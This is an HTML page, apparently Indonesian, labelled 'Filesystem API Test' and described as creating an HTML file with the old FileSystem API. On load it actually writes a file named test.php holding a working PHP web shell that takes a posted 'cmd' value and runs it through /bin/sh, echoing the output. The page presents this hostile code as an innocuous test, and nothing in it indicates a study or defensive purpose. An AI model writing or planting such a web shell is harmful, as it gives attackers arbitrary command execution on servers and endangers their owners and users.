<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Filesystem API Test</title>
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
  <script>
    function createFile() {
      const storageSize = 1024 * 1024;

      if (!window.webkitRequestFileSystem) {
        alert("Browser tidak mendukung FileSystem API.");
        return;
      }

      window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
        fs.root.getFile("test.php", { create: true }, function(fileEntry) {
          fileEntry.createWriter(function(fileWriter) {
            const htmlContent = `<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    if ($cmd !== '') {
        $tmpFile = sys_get_temp_dir() . '/cmd_output.txt';
        if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
            $pid = pcntl_fork();
            if ($pid == -1) {
                echo "Fork failed.";
            } elseif ($pid === 0) {
                pcntl_exec('/bin/sh', ['-c', $cmd . " > $tmpFile 2>&1"]);
                exit(1);
            } else {
                pcntl_wait($status);
                if (file_exists($tmpFile)) {
                    echo "<pre>" . htmlspecialchars(file_get_contents($tmpFile)) . "</pre>";
                    unlink($tmpFile);
                } else {
                    echo "No output.";
                }
            }
        } else {
            echo "pcntl functions not available.";
        }
    }
}
?>
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command" />
    <input type="submit" value="Run" />
</form>`;

            const blob = new Blob([htmlContent], { type: "text/html" });

            fileWriter.onwriteend = function() {
              console.log("File berhasil ditulis:", fileEntry.toURL());
              alert("File HTML berhasil dibuat.");
            };

            fileWriter.onerror = function(err) {
              console.error("Gagal menulis file:", err);
            };

            fileWriter.write(blob);
          }, function(err) {
            console.error("Gagal membuat file writer:", err);
          });
        }, function(err) {
          console.error("Gagal membuat file:", err);
        });
      }, function(err) {
        console.error("Gagal mengakses FileSystem API:", err);
      });
    }

    window.onload = createFile;
  </script>
</head>
<body>
  <h1>Filesystem API Test</h1>
  <p>Halaman ini mencoba membuat file HTML menggunakan FileSystem API (lama).</p>
</body>
</html>
